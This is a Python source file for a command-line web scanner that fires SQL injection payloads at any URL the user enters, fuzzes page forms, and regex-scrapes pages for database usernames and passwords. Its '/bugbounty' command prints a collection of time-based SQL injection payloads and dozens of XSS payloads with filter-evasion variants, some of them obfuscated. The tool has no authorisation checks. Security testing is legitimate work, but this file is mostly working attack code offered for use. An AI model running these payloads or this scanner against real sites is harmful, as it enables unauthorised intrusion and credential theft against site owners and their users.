import requests
from bs4 import BeautifulSoup
import re
import platform
import os
import subprocess
import time
from tkinter import messagebox
import json
from datetime import datetime

def save_scan_to_txt(url, mode, vulnerabilities):
    appdata_path = os.getenv('APPDATA')
    save_folder = os.path.join(appdata_path, 'VulEasy')  
    if not os.path.exists(save_folder):
        os.makedirs(save_folder)

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"scan_{timestamp}.txt"
    file_path = os.path.join(save_folder, file_name)

    scan_data = f"URL: {url}\nMode: {mode}\nDate: {timestamp}\nVulnerabilities:\n"
    for vulnerability in vulnerabilities:
        scan_data += f"  - {vulnerability}\n"
    scan_data += f"\nOS: {platform.system()}\nPython Version: {platform.python_version()}\n"

    print(f"[DEBUG] scan_data: \n{scan_data}")

    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(scan_data)

    print(f"[INFO] Scan results saved to {file_path}")

def load_payloads(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Payload file '{file_path}' not found.")
        return []
    except Exception as e:
        print(f"[ERROR] Failed to load payloads from '{file_path}': {e}")
        return []

payload_1 = load_payloads("Payload_1.txt")
payload_2 = load_payloads("Payload_2.txt")

history = []

def is_valid_url(url):
    regex = re.compile(
        r'^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$', re.IGNORECASE
    )
    return re.match(regex, url) is not None

def detect(input_sequence):
    if len(input_sequence) != 2:
        return "[!] Please enter a mode (/1, /2, or /3) followed by a URL."

    mode, url = input_sequence

    if mode not in ['/1', '/2', '/3']:
        return "[!] First input must be /1, /2, or /3."
    elif not is_valid_url(url):
        return "[!] The second input must be a valid URL."
    else:
        return f"Mode: {mode}, URL: {url}"
    
def scan_sql_injection_mode1(url, payloads):
    redirected_urls = []  
    exposed_databases = []  
    
    for payload in payloads:
        print(f"Testing payload: {payload}")
        try:
            full_url = url + payload
            res = requests.get(full_url, timeout=10, allow_redirects=True)  

            if res.url != full_url:
                print(f"[VULNERABLE] Redirection detected. Original URL: {full_url} redirected to {res.url} with payload: {payload}")
                redirected_urls.append(res.url)

            if "error" in res.text.lower() and "database" in res.text.lower():
                print(f"[EXPOSED DB] Possible database exposure detected in {url} with payload: {payload}")
                exposed_databases.append(res.url)
                
            elif "error" in res.text.lower() or res.status_code == 500:
                print(f"[VULNERABLE] SQL injection vulnerability detected in {url} with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed: {e}")

    if redirected_urls:
        print(f"[INFO] The following SQLi payloads successfully redirected to:")
        for redir_url in redirected_urls:
            print(f" - {redir_url}")

    if exposed_databases:
        print(f"[INFO] Possible exposed databases detected:")
        for db_url in exposed_databases:
            print(f" - {db_url}")
    else:
        print("[INFO] NO DATABASES EXPOSED")

    return redirected_urls if redirected_urls else None

def scan_sql_injection_mode2(url, payloads):
    redirected_urls = []
    exposed_databases = []  
    
    for payload in payloads:
        print(f"Testing payload: {payload}")
        start_time = time.time()
        try:
            full_url = url + payload
            res = requests.get(full_url, timeout=10, allow_redirects=True)  
            end_time = time.time()
            duration = end_time - start_time
            
            if res.url != full_url:
                print(f"[VULNERABLE] Redirection detected. Original URL: {full_url} redirected to {res.url} with payload: {payload}")
                redirected_urls.append(res.url)

            if "error" in res.text.lower() and "database" in res.text.lower():
                print(f"[EXPOSED DB] Possible database exposure detected in {url} with payload: {payload}")
                exposed_databases.append(res.url)
                
            if duration > 5:  
                print(f"[VULNERABLE] Time-based SQL injection detected in {url} with payload: {payload}")
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed: {e}")

    if redirected_urls:
        print(f"[INFO] The following SQLi payloads successfully redirected to:")
        for redir_url in redirected_urls:
            print(f" - {redir_url}")

    if exposed_databases:
        print(f"[INFO] Possible exposed databases detected:")
        for db_url in exposed_databases:
            print(f" - {db_url}")
    else:
        print("[INFO] NO DATABASES EXPOSED")

    return redirected_urls if redirected_urls else None

def scan_sql_injection_mode3(url):
    redirected_urls = []  
    exposed_databases = []  
    
    def get_forms(url):
        soup = BeautifulSoup(requests.get(url, timeout=10).content, "html.parser")
        return soup.find_all("form")

    def form_details(form):
        details_of_form = {}
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get")
        inputs = []

        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value,
            })

        details_of_form['action'] = action
        details_of_form['method'] = method
        details_of_form['inputs'] = inputs
        return details_of_form

    def vulnerable(response):
        errors = {"quoted string not properly terminated",
                  "unclosed quotation mark after the character string",
                  "you have an error in your SQL syntax"
                  }
        for error in errors:
            if error in response.content.decode().lower():
                return True
        return False

    print(f"\n[+] Scanning URL: {url}")
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.\n")

    for form in forms:
        details = form_details(form)
        action = details["action"]
        if not action:
            action = ""  

        for i in "\"'":
            data = {}
            for input_tag in details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    data[input_tag['name']] = input_tag["value"] + i
                elif input_tag["type"] != "submit":
                    data[input_tag['name']] = f"test{i}"

            full_url = url + action
            if details["method"] == "post":
                try:
                    res = requests.post(full_url, data=data, timeout=10, allow_redirects=True)  
                except requests.exceptions.RequestException as e:
                    print(f"[ERROR] Request failed: {e}")
                    continue  
            elif details["method"] == "get":
                try:
                    res = requests.get(full_url, params=data, timeout=10, allow_redirects=True)  
                except requests.exceptions.RequestException as e:
                    print(f"[ERROR] Request failed: {e}")
                    continue  

            if res.url != full_url:
                print(f"[VULNERABLE] Redirection detected. Original URL: {full_url} redirected to {res.url} with payload: {i}")
                redirected_urls.append(res.url)

            if "error" in res.text.lower() and "database" in res.text.lower():
                print(f"[EXPOSED DB] Possible database exposure detected in {url} with payload: {i}")
                exposed_databases.append(res.url)

            if vulnerable(res):
                print(f"[VULNERABLE] SQL injection vulnerability detected in {url} with payload: {i}")
                print(f"[INFO] The SQLi payload successfully redirected to: {res.url}")
                redirected_urls.append(res.url)

    if redirected_urls:
        print(f"[INFO] The following SQLi payloads successfully redirected to:")
        for redir_url in redirected_urls:
            print(f" - {redir_url}")

    if exposed_databases:
        print(f"[INFO] Possible exposed databases detected:")
        for db_url in exposed_databases:
            print(f" - {db_url}")
    else:
        print("[INFO] NO DATABASES EXPOSED")

    return redirected_urls if redirected_urls else None

def clear_terminal():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def show_history():
    appdata_path = os.getenv('APPDATA')
    save_folder = os.path.join(appdata_path, 'VulEasy')  
    if not os.path.exists(save_folder):
        print("[INFO] No scan history found.")
        return

    txt_files = [f for f in os.listdir(save_folder) if f.endswith(".txt")]
    if txt_files:
        print("History of scanned URLs:")
        for idx, file in enumerate(txt_files, start=1):
            print(f"{idx}: {file}")
    else:
        print("[INFO] No scan history found.")

def clear_history():
    appdata_path = os.getenv('APPDATA')
    save_folder = os.path.join(appdata_path, 'VulEasy')  
    if not os.path.exists(save_folder):
        print("[INFO] No scan history found.")
        return

    txt_files = [f for f in os.listdir(save_folder) if f.endswith(".txt")]
    if txt_files:
        for file in txt_files:
            file_path = os.path.join(save_folder, file)
            os.remove(file_path)
            print(f"[INFO] Deleted {file}")
    else:
        print("[INFO] No scan history found.")

def list_commands():
    print("/1 - Scan using rapid payloads")
    print("/2 - Scan using time-based payloads")
    print("/3 - Scan with form analysis and SQL injection checks (https://github.com/daharaboi/SQLinjection_Scanner)")
    print("/4 - Scan exposed in code databases")
    print("/bugbounty - The Payload´s you need to search a Bug Bounty.")
    print("/clear - Clears the terminal")
    print("/history - Shows the command history")
    print("/clearhistory - Clears the command history")
    print("/list - Shows this list of commands")
    print("/credits - Shows creator name")
    print("/exit - Exit for exit here ")
    print("/quit - Quit for go here")

def hackorbugbounty():
    print("Part 1.")

    print("'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z")
    print("Checks if `now()` equals `sysdate()`. If true, it induces a 10-second delay.")

    print("\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z")
    print("Similar string that tries conditional injection based on delay.")

    print("X'XOR(if(now()=sysdate(),//sleep(10)//,0))XOR'X")
    print("Uses comments (`//`) to attempt evading filters.")

    print("X'XOR(if(now()=sysdate(),(sleep(10)),0))XOR'X")
    print("Encapsulates `sleep(10)` with parentheses to enforce a delay.")

    print("X'XOR(if((select now()=sysdate()),BENCHMARK(10000000,md5('xyz')),0))XOR'X")
    print("Uses `BENCHMARK` with `MD5` for performance and brute-force tests.")

    print("'XOR(SELECT(0)FROM(SELECT(SLEEP(10)))a)XOR'Z")
    print("Subquery that induces a delay using `SLEEP(10)`.")

    print("(SELECT(0)FROM(SELECT(SLEEP(10)))a)")
    print("Simplified subquery that includes `SLEEP(10)`.")

    print("'XOR(if(now()=sysdate(),sleep(10),0))OR'")
    print("Combination of XOR and OR operators for injection.")

    print("1 AND (SELECT(0)FROM(SELECT(SLEEP(10)))a)-- wXyW")
    print("Combines a logical `AND` with a subquery to cause a delay.")

    print("(SELECT * FROM (SELECT(SLEEP(10)))a)")
    print("Subquery that delays execution with `SLEEP(10)`.")

    print("'%2b(select*from(select(sleep(10)))a)%2b'")
    print("URL encoding (`%2b` represents `+`) to evade detection.")

    print("CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(10))END")
    print("Conditional to delay if the version has a specific length.")

    print("');(SELECT 4564 FROM PG_SLEEP(10))--")
    print("PostgreSQL payload using `PG_SLEEP(10)` to delay execution.")

    print("DBMS_PIPE.RECEIVE_MESSAGE([INT],10) AND 'bar'='bar")
    print("Oracle payload using `DBMS_PIPE.RECEIVE_MESSAGE` to induce a delay.")

    print("-1' or 1=IF(LENGTH(ASCII((SELECT USER())))>13, 1, 0)--//")
    print("Evaluates specific conditions on the user and executes code.")

    print("BENCHMARK(10000000,MD5(CHAR(116)))")
    print("Forces high resource consumption via intensive calculations.")

    print("'%2bbenchmark(10000000,sha1(1))%2b'")
    print("Tests performance using `BENCHMARK` with URL encoding.")

    print("'OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < '0:0:1') THEN (SELECT '1'||PG_SLEEP(1)) ELSE '0' END)='1")
    print("Uses `CASE` and `PG_SLEEP` to delay queries based on PostgreSQL conditions.")

    print("Part 2.")

    print('>alert(154)</script><script/154=’;;;;;;;', "A script that triggers an alert with number 154.")
    print('<ScriPt>ᨆ="",ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()', "An obfuscated script that executes an `alert` with a dynamically calculated value.")
    print('<script TEST>alert(1)</script TESTTEST>', "A script attempting to trigger an alert but with an unusual attribute name.")
    print('<ScriPt 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?', "A script that uses mathematical operations in the tag name.")
    print('"><script akdk> prompt(document.domain)</script akdk>', "A script that shows the page domain via `prompt`.")
    print('<script ~~~>alert(0%0)</script ~~~>', "A script with special characters showing an alert.")
    print('"<script>alert(0)</script>"@gmail.com', "An injection attempt with the script followed by an email address.")
    print('#/<script>alert(1234)</script>', "Injection in an HTML comment with a script triggering an alert.")
    print('/script>alert(1234)</script>', "A similar script with an error in the `script` tag opening.")
    print('<script>alert(1234)</script>', "A simple script showing an alert with value 1234.")
    print('<ScripT>alert(1234)</ScRipT>', "A variation of the script using uppercase in HTML tags.")
    print('"><script>alert(123)</script>', "An XSS injection attempt that opens a script tag with an alert.")
    print('\'"><script>alert(123)</script>', "Another attempt with a quote closure before opening the script.")
    print('--><script>alert(123)</script>', "An injection attack commented with `--` before executing the script.")
    print('><script>alert(123)</script>', "Script with an opening tag without a prior attribute.")
    print('＜script＞alert(123)＜/script＞', "Injection using Chinese characters instead of standard tag symbols.")
    print('"><script>alert(123);</script x="', "Using strange attributes in the `script` tag.")
    print('\'><script>alert(123);</script x=\'', "Another attempt using single quotes in the attribute.")
    print('><script>alert(123);</script x=', "Using a `script` tag with an incomplete attribute.")
    print('<script>’alert(1)’.replace(/.+/,eval)</script>', "A script with an alert that uses `replace` to obfuscate the code.")
    print('"><script>alert(1)</script><', "Injection with premature tag closure.")
    print('#<script>alert(1)</script>', "HTML comment followed by a script triggering an alert.")
    print('\'`"//><script>alert(1)</script>', "Injection with multiple quotes and special characters.")
    print('<!<script>alert(1)</script>', "Using a comment symbol (`<!`) before the `script` tag.")
    print('<!<script>alert(1)</script> “', "An attempt with double quotes at the end.")
    print('<%<!--\'%><script>alert(1);</script -->', "Using HTML comments along with the script.")
    print('<%<script>alert(1)</script>', "Another injection with a `<%` symbol to attempt code insertion.")
    print('<scr'+'ipt>alert(1)</scr'+'ipt>', "Obfuscation of the `script` tags by splitting their name.")
    print('<script /**/>/**/alert(1)/**/</script /**/', "A script with additional comments inside the tag.")
    print('javascript:alert(\'document.cookie\')', "A JavaScript link that shows the document's cookies.")
    print('<script>/&/-alert(1)</script>', "Another script variant with extra characters.")
    print('<script>alert(1)</script>', "A simple script showing an alert.")
    print('<script>alert`1`</script>', "Using a backtick to enclose the value to display.")
    print('\\<script\\>alert(1)\\<\\/script\\>', "Injection using escaped characters.")
    print('“><script>alert(1);</script>', "Injection with special quotes ending the HTML attribute.")
    print('<sCRipT>alert(1)</sCRiPt>', "Another variation of the `script` tag using a mix of uppercase and lowercase letters.")
    print('<ScRiPt>alert(1)</sCriPt>', "A similar variation with a different combination of uppercase and lowercase letters.")
    print('#<ScRiPt>alert(1)</ScRiPt>#', "HTML comment with the alert script.")
    print('<ScRiPt>alert(1)</ScRiPt>', "An attack with the `script` tag name partially changed.")
    print('<<SCRIPT>alert(1);//<</SCRIPT>', "Injection with multiple opening symbols.")
    print('*/</script>\'>alert(1)/*<script/1=\'', "Injection with closing comments to try closing the script.")
    print('<script>alert(1)</script>.asp', "A script followed by an ASP file extension.")
    print('<script>alert(1)</script>.aspx', "A variant with `.aspx` extension.")
    print('<script>alert(1)</script>.htm', "Another example with `.htm` extension.")
    print('<script>alert(1)</script>.html', "Example with `.html` extension.")
    print('<script>alert(1)</script>.php', "Injection in a `.php` file.")
    print('\"><script>alert(2);</script>', "A script showing an alert with value 2.")
    print('\'>  <script>alert(2);</script>', "Another variant with single quotes and an alert.")
    print('\'>  <script>alert(2);</script>', "Injection with `>` and the alert script.")
    print('\'>👽💻🔥<script>alert(2);</script>', "An attempt with emojis alongside the alert script.")
    print('"><script>alert(2);</script>', "Script similar to the previous ones with a different value in the alert.")
    print('\'>"><script>alert(2);</script>', "Another variant with quote closure before the script.")
    print('\'>"><script>alert(2);</script>', "An injection showing an alert with value 2.")

def credits():
    print("Developed by @mrduck123 using ChatGPT. And special thanks to https://github.com/daharaboi/SQLinjection_Scanner thanks @daharaboi\n")

def check_for_exposed_databases_in_code_scan_sql_injection_mode4(url):
    try:
        res = requests.get(url, timeout=10)
        res.raise_for_status()  
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Could not access {url}: {e}")
        return None

    content = res.text
    
    patterns = [
        r'(mysql|postgres|mongodb|sql)[^a-zA-Z0-9]{0,5}(username|user|password|db|host|database)[^a-zA-Z0-9]{0,5}=\s*["\']?([^"\']+)',  
        r'(db_user|db_pass|db_host|db_name)[^a-zA-Z0-9]{0,5}=\s*["\']?([^"\']+)',  
        r'password\s*=\s*["\']?([^\s"\']+)',  
        r'config\s*=\s*["\']?([^"\']+)',  
        r'inurl:(?=.*admin)(?=.*database)',  
    ]

    exposed_data = []
    
    for pattern in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        if matches:
            exposed_data.extend(matches)
    
    if exposed_data:
        print(f"[INFO] Possible exposed database-related data found in {url}:")
        for data in exposed_data:
            print(f" - Found: {data}")
        return exposed_data
    else:
        print(f"[INFO] No exposed database data found in {url}.")
        return None

def main():
    selected_mode = None

    while True:
        print("## ## ## ## ##   #####     ###         ### ##  ##")
        print("## ## ## ## ##   #####    ## ##       ## #  ####")
        print("## ## ## ## ##   #----   ##---##      ##     ##")
        print("## ## ## ## #### #####  ##     ##   # ##     ##")
        print(" ###  ##### #### ##### ##       ##   ###     ##")
        print("/1, /2, /3, or /4 to select a mode. Enter a valid URL to scan and use /list for the list of commands.\n")

        user_input = input("Enter your command: ")

        if user_input.lower() in ['/exit', '/quit']:
            break
        elif user_input == '/bugbounty':
            hackorbugbounty()
        elif user_input == '/clear':
            clear_terminal()
        elif user_input == '/history':
            show_history()
        elif user_input == '/clearhistory':
            clear_history()
        elif user_input == '/list':
            list_commands()
        elif user_input == '/credits':
            credits()
        elif user_input in ['/1', '/2', '/3', '/4']:
            selected_mode = user_input
            print(f"[+] Mode selected: {selected_mode}. Now enter a valid URL to proceed")
        elif is_valid_url(user_input):
            if not selected_mode:
                print("[!] Please select a mode first (/1, /2, /3, or /4) before entering a URL")
            else:
                history.append(user_input)
                print(f"[+] URL added to history: {user_input}")
                if selected_mode == '/1':
                    vulnerabilities = scan_sql_injection_mode1(user_input, payload_1)
                    save_scan_to_txt(user_input, selected_mode, vulnerabilities or [])
                elif selected_mode == '/2':
                    vulnerabilities = scan_sql_injection_mode2(user_input, payload_2)
                    save_scan_to_txt(user_input, selected_mode, vulnerabilities or [])
                elif selected_mode == '/3':
                    vulnerabilities = scan_sql_injection_mode3(user_input)
                    save_scan_to_txt(user_input, selected_mode, vulnerabilities or [])
                elif selected_mode == '/4':  
                    vulnerabilities = check_for_exposed_databases_in_code_scan_sql_injection_mode4(user_input)
                    save_scan_to_txt(user_input, selected_mode, vulnerabilities or [])
                selected_mode = None
        else:
            print("[!] Invalid input. Enter a valid command or URL or PLEASE SELECT A MODE FIRST (/1, /2, /3, or /4)")
        
if __name__ == "__main__":
    main()